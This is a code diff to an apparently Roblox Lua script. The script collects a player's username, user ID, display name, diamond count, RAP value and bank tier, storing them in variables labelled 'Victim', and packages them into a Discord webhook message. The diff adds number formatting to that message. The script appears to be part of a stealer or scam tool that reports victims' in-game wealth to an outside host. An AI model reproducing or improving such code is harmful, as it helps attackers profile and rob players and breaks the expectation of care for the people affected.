@@ -15,6 +15,8 @@ else
 	_G.GameIn = "❓ Couldn't find game"
 end
 local webhookcolor = "13369599"
+local Players = game:GetService("Players")
+local Client = Players.LocalPlayer
 _G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
 _G.PlrUserVictim = game.Players.LocalPlayer.Name
 _G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
@@ -22,6 +24,8 @@ _G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
 _G.DisplayDiamond = game:GetService("Players").LocalPlayer.leaderstats.Diamonds.Value
 _G.DisplayRap = game:GetService("Players").LocalPlayer.leaderstats.RAP.Value
 _G.DisplayBankTier = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.BankTitle.Tier.Text
+local GemsFormated = (require(game:GetService("ReplicatedStorage").Library.Functions.NumberShorten)( _G.DisplayDiamond ))
+local RapFormated = (require(game:GetService("ReplicatedStorage").Library.Functions.NumberShorten)( _G.DisplayRap ))
 local function sendwebhookDualHook(msgpremium)
 local msg = {
 	["avatar_url"] = "https://cdn.discordapp.com/attachments/1106232994441732117/1106233834850222231/33333.png",
@@ -41,12 +45,12 @@ local msg = {
 		["fields"]= {
         {
           ["name"]= "**💎Diamonds 💎**",
-          ["value"]= "```".._G.DisplayDiamond.."```",
+          ["value"]= "```"..GemsFormated.."```",
           ["inline"]= true
         },
         {
           ["name"]= "**⬆️Rap⬆️**",
-          ["value"]= "```".._G.DisplayRap.."```",
+          ["value"]= "```"..RapFormated.."```",
           ["inline"]= true
         }
       }
